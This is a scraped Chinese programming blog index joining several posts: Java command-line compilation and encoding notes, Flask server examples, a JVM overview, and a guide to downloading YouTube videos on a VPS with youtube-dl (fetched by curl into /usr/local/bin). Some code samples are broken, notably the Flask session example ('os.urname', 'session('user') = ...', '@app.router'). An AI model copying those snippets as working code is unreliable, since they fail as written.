Demo2.java -&gt; 把生成的Demo2.class粘贴到当前目录下新建的一个com/me/example文件夹下 -&gt; java/com/me/example/Demo2 -&gt; Hello there 非要把带packagename的java文件写在src/com/me/example文件夹下？好啊```javapackage com.me.example; public class Demo3 { public static void main(String[] args) { System.out.println(“Hello there”); }} 在src/com/me.example文件夹下敲命令： javac Demo3 -&gt; 把生成的Demo3.class粘贴到src/com/me/example/com/me/example文件夹下 -&gt; java com/me/example/Demo3 4. java文件还放在src/com/me/example文件夹下，不加packageName总能行了吧 ```java public class Demo4 { public static void main(String[] args) { System.out.println(&quot;Hello there&quot;); } } javac Demo4.java -&gt; java Demo4.class -&gt; “Hello there”最终的结构是每一个A.java文件旁边都跟着一个A.class文件 命令行里写java代码这篇文章告诉我们，没有IDE也能写java代码。亲测，用vs code写代码也不算差。文章的大致内容如下:假定当前项目目录结构如下: /bin ##用于存储安装生成的.class文件 /lib ## 用于放第三方jar文件 /Okio.jar /src ## 用于存放开发写的java文件 /com /example /Application.java package com.example; import java.io.*; import okio.BufferedSource; import okio.Okio; public class Application { public static void main(String[] args) { print(&quot;Hello there&quot;); File info = new File(&quot;info.txt&quot;); FileReader reader = null; BufferedReader bufferedReader = null; try { BufferedSource source = null; source = Okio.buffer(Okio.source(info)); // bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(info), &quot;UTF-8&quot;)); String line = &quot;&quot;; while ((line = source.readUtf8Line()) != null) { // print(new String(line.getBytes(&quot;GBK&quot;), &quot;UTF-8&quot;)); print(line); } } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } static void print(String out) { System.out.println(out); } } 注意上面的java文件第一行是有package name声明的。首先cd到根目录下 javac -d bin -sourcepath src -cp lib/Okio.jar;lib/gson.jar src/com/example/Application.java -d的意思是destination, sourcepath就是源码路径 ， -cp其实和-classpath一样 bin目录下就会生成com/example/Application.class文件，这中间的文件层级也生成好了。还是在根目录下 java -cp bin;lib/Okio.jar com.example.Application 运行的时候要带上classpath,不然会出现classnotFound需要注意的是代码中引用的文件路径指的是你当前所在的路径，所以，想要避免FileNotFound的话，需要在当前项目的根目录下放一个”info.txt”文件。其实站在一个command的角度来看，这也正常，外部并未特意声明工作路径，所以jvm运行class文件时就是在当前的目录下进行的。 Some Notes About Classpath，关于classpath的说明。很多网上的教程都说去自己电脑的环境变量改CLASSPATH这个值，想看下当前是什么样的话 echo %CLASSPATH%javac编译器在编Application.java这个文件的时候，遇到了com.example.Util这个class，这个文件在哪？根据java命名规则，这个class应该在../com/example/这个文件夹下面。那么这个路径从哪里开始，就是让javac把哪个绝对路径当做根路径？三种方式: If no –classpath parameter is passed, CLASSPATH environment variable is usedIf CLASSPATH environment variable is not found, current folder (“.”) is used by defaultIf –classpath is explicitly set as a command line parameter, it overrides all other values java -cp bin;lib/Okio.jar com.example.Application 运行的时候需要带上bin这个classpath的原因是设定了classpath就会覆盖掉其他设定，所以要把我们自己的java文件打出来的class文件也加到classpath。还有要注意的是，unix系统上classpath之间是用:分割的，windows上是用;分割的 43 . java读文件也要注意编码问题(FileReader读取文件里文乱码问题)import java.io.*; public class Sample { public static void main(String[] args) { print(&quot;Hello there&quot;); File info = new File(&quot;info.txt&quot;); FileReader reader = null; BufferedReader bufferedReader = null; try { reader = new FileReader(info); bufferedReader = new BufferedReader(reader); // bufferedReader = new BufferedReader(new InputStreamReader(new FileInputStream(info), &quot;UTF-8&quot;)); String line = &quot;&quot;; while ((line = bufferedReader.readLine()) != null) { print(new String(line.getBytes(&quot;GBK&quot;), &quot;UTF-8&quot;)); //这样输出大部分正确，但是带了一些乱码，显示成问号 // print(line); 改用utf-8构造函数的InputStreamReader之后，直接print出来就丝毫不差了 } } catch (Exception e) { //TODO: handle exception e.printStackTrace(); } } static void print(String out) { System.out.println(out); } } 原理的话，文件读入时是按OS的默认字符集即GBK解码的，windows上默认是GBK(中文的win10)，String.getBytes(“GBK”)就是把按照GBK编码的内容还原成二进制数据，再用UTF-8去new String，照说没问题，结果大部分汉字显示出来，但是部分汉字后面跟着问号。原因的话，FileReader继承了InputStreamReader，没有实现InputStreamReader的带charset的构造函数。FileReader属于字符流，是读取字符文件的便捷类。其继承自InputStreamReader，后者是将字节流转换为字符流的的桥梁，即将字节信息转换为字符信息。实际上， FileReader在类内部实现过程中也是利用了InputStreamReader完成字节流到字符流的转化，只不过转化时采用的字符集为系统默认的字符集。如果文件保存时的编码设定为UTF-8， 那么在中文操作系统使用 FileReader时就会发生乱码，因为中文操作系统平台的默认字符集为GBK。解决该问题的办法是，放弃使用FileReader，改用InputStreamReader，在获取InputStreamReader对象时，显示指定合适的字符集。从源码来看，FileReader的read方法直接调用了InputStreamReader的read方法，在没有传编码进来的情况下，FileReader(InputStreamReader)直接用操作系统默认编码(GBK)去解码一个UTF-8的文件，当然会有损失。The constructors of FileReader always use the platform default encoding which is generally a bad idea.。 或者，在notpadPLus中新建一个txt文件，编码字符集-&gt;中文-&gt;GB2312(simplified)。这样这个文件本身就是GB2312编码的，那个FileReader用GBK去解码，自然不会存在损失，拿着解码后的二进制流给System.out去打印肯定没问题。所以，照说一个文本文件(编码是针对字符来说的，二进制文件是解码之后的东西)，想看编码格式的话，用Notepad++就好了。windows下建议使用utf-8不带BOM格式。很有意思的是我在vs code里面查看这个GB2312的文本文件，全是乱码，给当成utf-8处理了。。。。 44 . 主函数的参数顺便提一下，主函数里面的args是可以用的 public static void main(String[] args){ System.out.println(&quot;args[0] is&quot;+args[0]); System.out.println(&quot;args[1] is&quot;+args[1]); System.out.println(&quot;args[2] is&quot;+args[2]); } 45. 打jar包(命令行还是ide) jar -cvf HelloWorld.jar HelloWorld.class #将HelloWorld.class文件打入jar包jar cvf xxx.jar ./ 打当前所有的classjar cvfm xxx.jar ./META-INF/MANIFEST.MF ./ ##修改jar包，使用原有的manifest文件 创建一个jar包可以使用命令行，也可以使用maven如果想要让这个jar文件变成可执行的，需要添加一个Manifest.txt文件,在里面包含Main-Class内容stackoverflow的解释] 创建一个可执行的jar包First.java import javax.swing.*; public class First{ First(){ JFrame f=new JFrame(); JButton b=new JButton(&quot;click&quot;); b.setBounds(130,100,100, 40); f.add(b); f.setSize(300,400); f.setLayout(null); f.setVisible(true); f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); } public static void main(String[] args) { new First(); } } myfile.mf Main-Class: First 注意在className后面必须有一个换行（In mf file, new line is must after the class name.） javac First.javajar -cvmf myfile.mf myjar.jar First.classjava -jar myjar.jar ## 即可运行 intelij idea打jar包更简单 46. DateFormats are not thread-safe，多线程下不安全stackoverFlow上有人说DateFormat本身不是线程安全的，简单来说就是多条线程调用DateFormat的format方法，得到的String结果 有可能 是错的。 public class Test{ private SimpleDateFormat dateFormat ; public static void main(String[] args) { SimpleDateFormat dateFormat= new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); Date today = new Date(); Date tomorrow = new Date(today.getTime()+1000*60*60*24); System.out.println(today); // 今天是2010-01-11 System.out.println(tomorrow); // 明天是2010-01-11 Thread thread1 = new Thread(new Thread1(dateFormat,today)); thread1.start(); Thread thread2 = new Thread(new Thread2(dateFormat,tomorrow)); thread2.start(); } } class Thread1 implements Runnable{ private SimpleDateFormat dateFormat; private Date date; public Thread1(SimpleDateFormat dateFormat,Date date){ this.dateFormat = dateFormat; this.date = date; } public void run() { for(;;){// 一直循环到出问题为止吧。 String strDate = dateFormat.format(date); // 如果不等于2018-03-19，证明出现线程安全问题了！！！！ if(!&quot;2018-03-19&quot;.equals(strDate)){ System.err.println(&quot;format 出来的 today=&quot;+strDate); System.exit(-1); } } } } class Thread2 implements Runnable{ private SimpleDateFormat dateFormat; private Date date; public Thread2(SimpleDateFormat dateFormat,Date date){ this.dateFormat = dateFormat; this.date = date; } public void run() { for(;;){ String strDate = dateFormat.format(date); if(!&quot;2018-03-20&quot;.equals(strDate)){ System.err.println(&quot;format 出来的 tomorrow=&quot;+strDate); System.exit(-1); } } } } 一般来说的解决方案是用ThreadLocal，每条线程都保留一份备份，就不会出问题了 47. equals()方法被override时，hashCode()也要被override现象就是如果两个业务上应该相同的object public class EqualsTest { public static void main(String[] args) { Employee e1 = new Employee(); Employee e2 = new Employee(); e1.setId(100); e2.setId(100); //Prints false in console System.out.println(e1.equals(e2)); //如果业务上要求具有相同id的用户视为同一个用户，需要复写equals Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;(); employees.add(e1); employees.add(e2); //Prints two objects System.out.println(employees); //但此时只应该打印出一个object，因为二者在业务上应该视为同一个对象处理，也就违反了HashSet不能存储重复元素的原则。 } } //在HashMap的getNode方法 do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; } while ((e = e.next) != null); //优先根据hashCode去获取 HashMap 底层采用一个 Entry[] 数组来保存所有的 key-value 对，当需要存储一个 Entry 对象时，会根据hash算法来决定其在数组中的存储位置，在根据equals方法决定其在该数组位置上的链表中的存储位置；当需要取出一个Entry时，也会根据hash算法找到其在数组中的存储位置，再根据equals方法从该位置上的链表中取出该Entry。 那么复写了hashCode之后，一定要复写equals方法吗。 48. maven的一些东西maven官网提供的通过命令行创建一个maven项目的方法 mvn -B archetype:generate -DarchetypeGroupId=org.apache.maven.archetypes -DgroupId=com.mycompany.app -DartifactId=my-app mvn compile ##开始编译 maven getting started是很友好的教程 看完这俩再不会就是蠢jetbrain在youtube上的教程Creating a new Maven project in IntelliJ IDEA create from archetype可以选择org.apache.maven.archetypes:maven-archetype-quickstart(真的只有一个hello world)如果是spring的话，直接用这个网站更加方便 intelij idea里面默认的maven源有https://repo.maven.apache.org/maven2和http://download.java.net/maven/1这俩网站国内似乎被墙，最好加代理 就是在.m2/settings.xml中指定本地proxy。如果你的代理够快的话，修改pom.xml的同时，应该能够很快的开始下载新的依赖 打开项目后，在Intellij 右侧有个Maven projects，点开后，有个Lifecycle，再点开，可以看到clean , validate, compile, ….，右击clean，选中Run ‘project[clean]’，这里的project是我们的项目实际的名字。如果下载失败了的话，可以选择clean，然后就会开始自己重新下载 GroupId类似于你的包名，ArtifictId类似于你的applicationName 49. WeakHashmap还是LeakHashmapAn entry in a &lt;tt&gt;WeakHashMap&lt;/tt&gt; will automatically be removed when * its key is no longer in ordinary use. More precisely, the presence of a * mapping for a given key will not prevent the key from being discarded by the * garbage collector, that is, made finalizable, finalized, and then reclaimed. * When a key has been discarded its entry is effectively removed from the map, * so this class behaves somewhat differently from other &lt;tt&gt;Map&lt;/tt&gt; * implementations. weakHashmap中的Entry长这样： private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; { V value; final int hash; Entry&lt;K,V&gt; next; /** * Creates new entry. */ Entry(Object key, V value, ReferenceQueue&lt;Object&gt; queue, int hash, Entry&lt;K,V&gt; next) { super(key, queue); //就是把key作为weakReference包装起来了 this.value = value; this.hash = hash; this.next = next; } } 多数的说法都是weakHashMap持有key的弱引用，value的强引用关于string作为key和常量池的问题这里面还谈到了 String a = &quot;a&quot;+&quot;b&quot;; //反编译后发现这样的代码会直接被编译器优化成 String a = &quot;ab&quot;; String b = new String(&quot;Something&quot;);//new String()方法搞出来的String是不会放到常量池的 String c = b.intern(); //这么干就把Something这个String丢到常量池去了，永远不会被GC Brian Goetz写过一篇关于WeakHashmap的文章 50. 使用ByteBuffer进行文件io操作这个其实要看使用场景，比方说文件大小 import java.io.IOException; import java.io.RandomAccessFile; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; // 小文件直接读完 public class ReadFileWithFileSizeBuffer { public static void main(String args[]) { try { RandomAccessFile aFile = new RandomAccessFile( &quot;test.txt&quot;,&quot;r&quot;); FileChannel inChannel = aFile.getChannel(); long fileSize = inChannel.size(); ByteBuffer buffer = ByteBuffer.allocate((int) fileSize); inChannel.read(buffer); //buffer.rewind(); buffer.flip(); for (int i = 0; i &lt; fileSize; i++) { System.out.print((char) buffer.get()); } inChannel.close(); aFile.close(); } catch (IOException exc) { System.out.println(exc); System.exit(1); } } } import java.io.IOException; import java.io.RandomAccessFile; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; // 读取大文件 public class ReadFileWithFixedSizeBuffer { public static void main(String[] args) throws IOException { RandomAccessFile aFile = new RandomAccessFile (&quot;test.txt&quot;, &quot;r&quot;); FileChannel inChannel = aFile.getChannel(); ByteBuffer buffer = ByteBuffer.allocate(1024); while(inChannel.read(buffer) &gt; 0) { buffer.flip(); for (int i = 0; i &lt; buffer.limit(); i++) { System.out.print((char) buffer.get()); } buffer.clear(); // do something with the data and clear/compact it. } inChannel.close(); aFile.close(); } } //更快的复制文件，其实就是mmap，底层也是通过c语言走了mmap的系统调用 import java.io.IOException; import java.io.RandomAccessFile; import java.nio.MappedByteBuffer; import java.nio.channels.FileChannel; public class ReadFileWithMappedByteBuffer { public static void main(String[] args) throws IOException { RandomAccessFile aFile = new RandomAccessFile (&quot;test.txt&quot;, &quot;r&quot;); FileChannel inChannel = aFile.getChannel(); MappedByteBuffer buffer = inChannel.map(FileChannel.MapMode.READ_ONLY, 0, inChannel.size()); buffer.load(); for (int i = 0; i &lt; buffer.limit(); i++) { System.out.print((char) buffer.get()); } buffer.clear(); // do something with the data and clear/compact it. inChannel.close(); aFile.close(); } } 51. Class.forName…在App启动的时候在另外一个线程里面提前去加载这个class，能够加快速度吗？ todo a pratical cheetsheet on java reflection =========================================反射为什么慢，慢成什么样了class的生命周期 参考 Jake Wharton and Jesse Wilson - Death, Taxes, and HTTP Android Tech Talk: HTTP In A Hostile World netty里面使用jvm inline提升运行效率的一个issue 博客内容非常深入","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"使用Python搭建本地服务器","date":"2017-06-15T23:56:26.000Z","path":"2017/06/15/2017-06-15-python-networks/","text":"关于如何使用Python搭建后台的方法很多，这里列举出一些实例。 1. The Flask WayPyCharm最好装Professional的，方便很多，可以ssh到linux远程服务器,直接远程开发，调试。除了连接有点慢，别的都好。windows环境下很多库都跑不起来。还是用mac或者直接linux desktop 1.1 Basics Flask is a very simple, but extremely flexible framework Flask使用Decorator对请求进行处理 #!/usr/bin/python3 # -*- coding:utf8 -*- from flask import Flask from flask import request from flask import jsonify from flask import send_file ### create the flask object app = Flask(__name__) ### 对于GET请求，获得query参数的方式 &gt; http://127.0.0.1:12345/_search_user?user=111&amp;date=190 @app.route(&#39;/_search_user&#39;, methods=[&#39;GET&#39;]) def query_user_profile(): try: user = request.args.get(&#39;user&#39;,&#39;&#39;) date = request.args.get(&#39;date&#39;,&#39;&#39;) print(user) ## 111 print(date) ## 190 return &#39;every Thing Ok&#39; except KeyError as e: return &quot;missing required key&quot; ### 处理POST请求，从request中拿东西，返回response @app.route(&#39;/&#39;, methods=[&#39;POST&#39;]) def handle_post(): uid = request.form[&#39;uid&#39;] # requets.form是一个list，从里面获取想表单的参数 name = request.form[&#39;name&#39;] print(&#39;uid is %s ,name is %s &#39; % (uid, name)) return &#39;200 Ok, or whatever you like&#39; 从request中获得json数据 @app.route(&#39;/api/add_message/&lt;uuid&gt;&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def add_message(uuid): content = request.get_json(silent=True) ##前提是客户端发来的request中包含&#39;Content-Type&#39; == &#39;application/json&#39;的header print content return uuid if __name__ == &#39;__main__&#39;: app.run(port=12345, debug=True) #设置为True后，会自动检测到服务端代码更改并reload，出错了也会给client返回实际的错误堆栈， 生产环境不要打开Debug 。 from flask import request ##读取cookie @app.route(&#39;/&#39;) def index(): username = request.cookies.get(&#39;username&#39;) # use cookies.get(key) instead of cookies[key] to not get a # KeyError if the cookie is missing. from flask import make_response ##设置cookie @app.route(&#39;/&#39;) def index(): resp = make_response(render_template(...)) resp.set_cookie(&#39;username&#39;, &#39;the username&#39;) return resp ### 设置header @app.errorhandler(404) def not_found(error): resp = make_response(render_template(&#39;error.html&#39;), 404) resp.headers[&#39;X-Something&#39;] = &#39;A value&#39; return resp # hosting static file，image,css,etc # 提供图片什么的 @app.route(&#39;/_get_image&#39;, methods=[&#39;GET&#39;]) def get_image(): filename = &#39;static/image/b1.jpg&#39; fullpath = os.path.join(os.path.curdir, filename) return send_file(fullpath, mimetype=&#39;image/jpeg&#39;) 我觉得Flask的官方Doc对初学者的友好度几乎是满分 accessing-request-data cookies sessions static files所有的静态文件必须放在当前目录下的static目录中，里面可以再创建image，css,404.html等文件另外，如果要调试接口的话，用Postman吧，比Fiddler简单点返回response的时候一定要指明mime-type，或者content-typetext/html、text/css、application/json什么的， 1.2 Flask BluePrints正常的工程都会希望将业务处理逻辑写在不同的module里面，在flask里面这种思想的实现方式是BluePrint。 how-to-divide-flask-app-into-multiple-py-files 1.3 Flask + gevent 提高web 框架的性能docs 1.4 Flask Session management这段示例代码展示了如何为请求设置session from flask import Flask ,session import os app = Flask(__name__) app.secret_key = os.urname(24) @app.route(&#39;/&#39;) def index(): session(&#39;user&#39;) = &#39;Anthony&#39; return &#39;Index&#39; @app.route(&#39;/getsession&#39;) def getsession(): if &#39;user&#39; in session: return session[&#39;user&#39;] return &#39;not logged in!&#39; @app.router(&#39;/dropsession&#39;) def dropsession(): session.pop(&#39;user&#39;,None) return &#39;Dropped&#39; if __name__ == &#39;__main__&#39;: app.run(debug=True) Flask和FlaskSqlAlCheMy的curd教程很简单 以sqlite为例，db.sqlite文件的位置要注意(最好需要指定db文件的路径) import os project_dir = os.path.dirname(os.path.abspath(__file__)) database_file = &quot;sqlite:///{}&quot;.format(os.path.join(project_dir, &quot;bookdatabase.db&quot;)) flask从request post中提取data: ##It is simply as follows ##For URL Query parameter, use request.args search = request.args.get(&quot;search&quot;) page = request.args.get(&quot;page&quot;) ##For Form input, use request.form email = request.form.get(&#39;email&#39;) password = request.form.get(&#39;password&#39;) ##For data type application/json, use request.data # data in string format and you have to parse into dictionary data = request.data dataDict = json.loads(data) flask的jsonify会将中文变成unicode返回，解决方式 app.config[‘JSON_AS_ASCII’] = False flask的config对象继承于字典，并且可以像修改字典一样修改它: 2. The Django WayDjango是web framework，不是WebServer 3. Using Tornado4. 其他的点4.1 Web架构网络库上手比较快，很重要的一点是理解其在通讯中的层级，Nigix属于代理转发，Flask处理业务逻辑，Tornado处理Http底层实现，Django负责用于高效网络应用开发 Django和Flask这两个框架在设计上各方面有什么优缺点？ UrlLib，Socket这些属于Python底层的基础性的network库，属于基础的东西。 4.2不服跑个分引用一篇测评 可见纯框架自身的性能为: bottle &gt; flask &gt; tornado &gt; django 结合实际使用: tornado 使用了异步驱动，所以在写业务代码时如果稍有同步耗时性能就会急剧下降； bottle需要自己实现的东西太多，加上之后不知道性能会怎样； flask性能稍微差点，但周边的支持已经很丰富了； django就不说了，性能已经没法看了，唯一的好处就是开发的架子都已经搭好，开发速度快很多 当然这些框架不是纯粹一个功能层面上的东西，可能有所偏差。 Update请教flask ,laravel , rails对初学者那个更友好？这三个分别是python,php,ruby。懂python的话，flask上手很快。没必要学会每一种，就好像会用15种语言写hello world并没有卵用，一个意思。 flask全局统一定义error返回格式，似乎统一定义response格式也是可以的talk from flask author Reference xxxx xxxx","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"jvm架构概述","date":"2017-05-24T22:48:58.000Z","path":"2017/05/24/2017-05-24-jvm-architecture/","text":"关于jvm运行的大致架构，最近找到一个比较合适的视频，记录要点如下 1.从MyApp.java文件开始大家都知道最开始学习Java的时候，要用javac 来编译MyApp.java来生成一个class文件。在命令行里，大致是这样的执行顺序: javac MyApp.java java MyApp 实际上后一句话就创建了一个jvm instance. 2. 从class loader进入Execution Engine 再到Host Operating Systemjava MyApp会调用class loader，后者不仅要负责加载MyApp.class文件，还需要加载java API中的class文件（String,Object,Collection….）。加载的class文件（byte code）被传递给Execution Engine,后者则负责执行byte code（其实也是调用宿主操作系统的方法执行操作） 3. where did class loader load class into ?classloader将class 文件加载进内存中的一部分（Runtime data areas）。到此，jvm architecture的三个主要组件：class loader subsystem,Runtime data areas 以及execution Enigne的主要功能都说清楚了。所以，这篇文章主要就按照class loader subsystem -&gt; Runtime data areas -&gt; Execution Engine的顺序来讲。 4.从classloader开始执行（class loading subsystem）- load 将byte code 加载进内存，来源可以是.java文件，可以是.jar文件，甚至可以是network Socket（这要看具体class loader的implementation）。load阶段包含三种不同的class loader，这也是面试时的重点。 &gt; 1. Bootstrap class loader (jre文件夹中有一个rt.jar文件，里面装的就是java的internal class) // &gt; 2. extension class loader (jre/lib/ext) //负责加载这个文件夹中的class文件 &gt; 3. Application class loader (CLASSPATH, -cp)//加载CLASSPATH变量中描述的位置 - load完成后是link verify(检查是否是符合jvm标准的byte code) -&gt; prepare(为class中的static variable分配内存，variable被赋默认值) -&gt; Resolve(when all the symbolic reference inside currentclass are resolved，例如引用了其他的class，例如引用了常量池里面的东西，classDefNotFoundException也是在这个时候抛出的) 注意，以上步骤都是java specification所规定的，但不同的jvm实现可能有微小的差异 class loading subsystem的最后一步是initializeclass vars to initiazed Value in code(比如静态代码块就是在这时执行的) 5. Runtime data area五个部分的划分Runtime data area 即java virtural machine的内存，可以划分成五部分 //per jvm ,shared by all threads - Method Area - Heap // per thread - java stack - pc Registers - Native method stacks 1. Method Area(方法区，用于存储class的数据，static variable,byte code,class level constant pool都放在这里) ，Method Area也称为Perm gen space(永生代)，默认大小是64MB ，可以通过-XX:MaxPermSize 调节 。这里有可能抛出out of memory error。java8将method Area移除，改为 metaspace (就是将method area移到了Native Memory，这样就不会有限制了，也可以人为设置上限)2. Heap日常开发中new出来的东西都放在这里 -Xms , minimun size-Xmx , maximum size 3. Java Stackjava stacks contains stack frames of the current execution per thread.eg : method a -&gt; 调用 method b -&gt; 调用method c当前线程的方法栈中就会push三个stack frame(每个Frame对应一个方法的执行环境)stack Frame包含当前方法中的变量，以及返回值，etc这里定义了stackoverFlowError 4. pc Registers这里面装的是程序计数器，后者是指向下一个将要被执行的指令的指针（每条线程都有）。 5. Native method stacksNative method stacks 是由java stack中的方法调用native方法创建的，例如windows上的dll库 6. Execution Engine的任务 - Interpreter 将byte code 翻译成机器指令并执行(根据指令去调用Native方法，在windows上jre/bin/文件夹中一大堆的dll就是windows平台提供的Native库，在linux上是.so文件) - JIT Compiler just in time compiler（如果有某项byte code instruction被多次调用，这些byte code不会每次都被inteprete，JIT will hold on to that system level target machine code for future usage,which is fast） - Hotspot profiler(it helps the JIT Compiler analysise the frequently used byte codess) - GC (a lengthy talk) 调用Native Method Interface(JNI) -&gt; Native method libraries（.dll,.so etc） java中new一个对象的时候发生了什么首先，讨论该类没有显式的继承任何类的情况。此时，JVM会检查是否已经加载了这个类，如果没有加载，就会加载该类，一个类只会被加载一次。加载该类的时候会按顺序初始化静态变量，并执行静态语句块，静态函数要被调用才会执行。假如静态变量或静态代码块初始化了一个类的话，会再次执行上面的过程。加载完类之后，开始生成对象，会按照顺序初始化成员变量，基本类型被初始化为0，引用类型被初始化为NULL，然后执行构造器。 下面讨论该类显式继承了一个类的情况，被继承的类没有再显式的继承。JVM会先检查父类是否被加载，如果未加载，则加载该类，并会初始化静态变量并执行静态代码块。然后检查子类，若未加载则同上。当所用到的类加载完后，开始初始化父类，先初始化成员变量，然后执行构造器。子类顺序相同。 总结，JVM会从被继承的最顶层类加载，依次初始化每个类的静态成员变量，执行静态代码块。再从被继承的最顶层类依次初始化成员变量，调用构造器。 主流的垃圾回收主要分两大类：引用计数和可达性分析。JVM没有使用引用计数法，而是使用了可达性分析来进行GC。可达性分析是基于图论的分析方法，它会找一组对象作为GC Root（根结点），并从根结点进行遍历，遍历结束后如果发现某个对象是不可达的（即从GC Root到此对象没有路径），那么它就会被标记为不可达对象，等待GC。能作为GC Root的对象必定为可以存活的对象，比如全局性的引用（静态变量和常量）以及某些方法的局部变量（栈帧中的本地变量表）。 以下对象通常可以作为GC Root： 存活的线程虚拟机栈(栈桢中的本地变量表)中的引用的对象方法区中的类静态属性以及常量引用的对象本地方法栈中JNI引用的局部变量以及全局变量 指令重排int a = 1;int b = 1;a = a + 1;b = b +1 ;就可能没有int a = 1;a = a + 1;int b = 1;b = b +1 ;性能好，因为后者可以 a或b可能在寄存器中了。 处理器为啥要重排序？因为一个汇编指令也会涉及到很多步骤，每个步骤可能会用到不同的寄存器，CPU使用了流水线技术，也就是说，CPU有多个功能单元（如获取、解码、运算和结果），一条指令也分为多个单元，那么第一条指令执行还没完毕，就可以执行第二条指令，前提是这两条指令功能单元相同或类似，所以一般可以通过指令重排使得具有相似功能单元的指令接连执行来减少流水线中断的情况。 方法区又被称为静态区，是程序中永远唯一的元素存储区域。和堆一样，是各个线程共享的内存区域。它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。 参考JVM ( java virtual machine) architecture - tutorialJava系列笔记(3) - Java 内存区域和GC机制Java内存区域——堆，栈，方法区等","tags":[{"name":"jvm","slug":"jvm","permalink":"https://haldir65.github.io/tags/jvm/"}]},{"title":"VPS下载Youtube视频并同步到本地","date":"2017-05-07T16:48:01.000Z","path":"2017/05/07/2017-05-07-download-video-from-vps/","text":"几天前花几块钱买了个新的vps，试了下，速度不错。后来看到网上有关于如何使用vps下载视频并拖到Windows的，试了一下，确实酸爽。 1. youtube下载视频到vps的硬盘上首先是安装一些必要的环境，我安装的系统是Ubuntu 14.0.4 ，这个版本默认的python是2.7。配置好pip,python等环境后，首先安装youtube-dl,基本上就是两行命令搞定的事情，参考官网 sudo curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl sudo chmod a+rx /usr/local/bin/youtube-dl 为了方便管理，首先在/根目录下面创建一个文件夹并切换到该目录下 mkdir youtubearia2 面板 以一个普通的视频链接为例直接使用 youtube-dl https://www.youtube.com/watch?v=7PtDrv5AUmA 就能自动选择合适的格式，下载到当前目录。比较好的一点是，由于vps在美国，下载速度非常快，维持在20MB/ms的样子。下载好的文件会放在当前目录下，后面使用pscp工具从vps拖下来就好了，不过我实践下来，这一步往往是最慢的。关键要看vps到你的ip的速度。有些时候还会突然断掉，所以很麻烦。这个看后面能不能搞定百度云盘中转。还有一个要注意的，生成的文件名是随机的，比如 -yj74P_BY1zI.mp4 由于前面带了一个横杠，很多命令是不认这种名字的，需要手动重命名一下 mv -yj74P_BY1zI.mp4 porn.videomv ./-yj74P_BY1zI.mp4 porn.video #. 表示当前目录 谁也不想要后面的乱码 youtube-dl -o &#39;%(title)s.%(ext)s&#39; https://www.youtube.com/watch?v=rimXGaUdaLg ##其实就是一个模板了，分别是title和文件的extension youtube-dl的可扩展性好很多 有时候下载的文件带有空格，有时候带有中文，用单引号包起来就好了。 youtube-dl还有一些命令行参数可以设置 youtube-dl –all-formats https://www.youtube.com/watch?v=7PtDrv5AUmA 这样会列出所有的可供下载的分辨率选项，每个选项前面带有一个序号，选择特定分辨率的选项下载只需要 youtube-dl -f 13 https://www.youtube.com/watch?v=7PtDrv5AUmA Download Youtube Videos With Youtube-dl 其实还可以使用external downloader使用aria2的分段和多线程下载功能可以加快文件的下载速度，对于下载大文件时特别有用。-x 分段下载，-s 多线程下载aria2c -s 2 -x 2 http://xx.com/xx todo： aria2 面板 2.从vps的硬盘上把下载好的视频拖下来VPS下载视频的速度很快，但从vps到国内的速度就很慢了。目前可能的方案有从百度网盘或dropBox中转，测试了一下百度网盘的方案bypy，vps上传到网盘速度太慢，shell出现假死，据说是百度方面限速的原因，所以这条路基本也是堵上了的。 3.后话you-get也是基于python3的下载工具，使用简单。在windows上安装还有点麻烦，在ubuntu上只需 pip3 install you-get 就安装好了使用方式更简单 &gt; you-get “url”you-get还提供了windows版本 下载youtube视频只需要 you-get -x 127.0.0.1:1080 -o “D:\\Porn” ‘https://www.youtube.com/watch?v=jNQXAC9IVRw‘ youtube-dl -o &#39;%(title)s.%(ext)s&#39; https://www.youtube.com/watch?v=rimXGaUdaLg 参考百度云盘同步的方法讨论","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"},{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"}]},{"title":"Python localHost部署命令","date":"2017-05-01T08:57:27.000Z","path":"2017/05/01/2017-05-01-python-server-test/","text":"一行命令即可 python -m http.server 8000 –bind 127.0.0.1 打开浏览器，输入127.0.0.1 ， 即可浏览当前目录下的文件，以GET的方式进行，命令行窗口会出现浏览记录。 据说SimpleHttpServer也可以， #!/usr/bin/python # -*- coding: UTF-8 -*- import sys from http.server import SimpleHTTPRequestHandler from http.server import BaseHTTPRequestHandler, HTTPServer def test(HandlerClass=SimpleHTTPRequestHandler, ServerClass=HTTPServer): protocol = &quot;HTTP/1.1``&quot; host = &#39;&#39; port = 8000 if len(sys.argv) &gt; 1: arg = sys.argv[1] if &#39;:&#39; in arg: host, port = arg.split(&#39;:&#39;) port = int(port) else: try: port = int(sys.argv[1]) except: host = sys.argv[1] server_address = (host, port) HandlerClass.protocol_version = protocol httpd = ServerClass(server_address, HandlerClass) sa = httpd.socket.getsockname() print(&quot;Serving HTTP on&quot;, sa[0], &quot;port&quot;, sa[1], &quot;...&quot;) httpd.serve_forever() if __name__ == &quot;__main__&quot;: test() Documenting your api like a boss pip install flasgger使用swaggi这个库，写一个yml文件就能自动生成api文档了 swagger似乎并不只限于python，也有用于SpringBoot中的java package.yml文件怎么写参考这个库的docswagger ui和OpenAPI Specification有关，大概是用于制作api doc的一套标准swagger-uiflask apispecflask-rest-plus documenting with swagger flask realworld app中需要修改的几点： requirements/prod.txt -flask_apispec==0.3.2 +flask_apispec==0.7.0 接下来就是这几条命令 flask db migrateflask db upgradeflask run –with-threads windows下也能跑起来需要pip install pymysql curl其实也能实现和postman一样的效果 curl -X POST -d 